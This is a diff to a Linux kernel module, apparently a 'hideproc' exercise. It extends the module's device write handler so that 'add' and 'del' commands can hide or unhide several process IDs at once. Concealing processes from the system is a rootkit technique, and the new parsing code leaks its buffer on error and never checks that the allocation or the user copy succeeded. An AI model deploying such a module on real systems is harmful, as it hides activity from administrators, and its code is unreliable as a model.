@@ -3,6 +3,7 @@
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/proc_fs.h>
+
 #include "kallsyms.h"
 #include "ksyms.h"
 
@@ -170,22 +171,40 @@ static ssize_t device_write(struct file *filep,
                             size_t len,
                             loff_t *offset)
 {
+    int err;
     long pid;
-    char *message;
 
+    char *message;
     char add_message[] = "add", del_message[] = "del";
+    char delim[] = " ,";
+
     if (len < sizeof(add_message) - 1 && len < sizeof(del_message) - 1)
         return -EAGAIN;
 
     message = kvmalloc(len + 1, GFP_KERNEL);
     memset(message, 0, len + 1);
     copy_from_user(message, buffer, len);
+
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
-        kstrtol(message + sizeof(add_message), 10, &pid);
-        hide_process(pid);
+        char *pid_ptr = message + sizeof(add_message);
+        char *found = NULL;
+
+        while ((found = strsep(&pid_ptr, delim)) != NULL) {
+            err = kstrtol(found, 10, &pid);
+            if (err != 0)
+                return err;
+            hide_process(pid);
+        }
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
-        kstrtol(message + sizeof(del_message), 10, &pid);
-        unhide_process(pid);
+        char *pid_ptr = message + sizeof(del_message);
+        char *found = NULL;
+
+        while ((found = strsep(&pid_ptr, delim)) != NULL) {
+            err = kstrtol(found, 10, &pid);
+            if (err != 0)
+                return err;
+            unhide_process(pid);
+        }
     } else {
         kvfree(message);
         return -EAGAIN;
@@ -220,14 +239,14 @@ static int _hideproc_init(void)
 
     int r;
 
-	if ((r = init_kallsyms()))
-		return r;
+    if ((r = init_kallsyms()))
+        return r;
 
-	KSYMINIT_FAULT(kvm_lock);
-	KSYMINIT_FAULT(vm_list);
+    KSYMINIT_FAULT(kvm_lock);
+    KSYMINIT_FAULT(vm_list);
 
-	if (r)
-		return r;
+    if (r)
+        return r;
 
     printk(KERN_INFO "@ %s\n", __func__);
     err = alloc_chrdev_region(&dev, 0, MINOR_VERSION, DEVICE_NAME);
